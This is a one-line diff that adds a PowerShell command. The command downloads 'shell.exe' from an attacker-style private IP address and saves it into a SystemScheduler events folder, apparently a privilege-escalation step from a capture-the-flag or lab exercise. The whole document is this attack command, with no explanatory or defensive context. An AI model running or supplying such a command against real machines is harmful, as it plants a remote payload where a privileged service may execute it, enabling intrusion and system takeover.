@@ -1,0 +1,1 @@
+powershell -c "Invoke-WebRequest -Uri '10.11.116.65:8000/shell.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Events\shell.exe'"
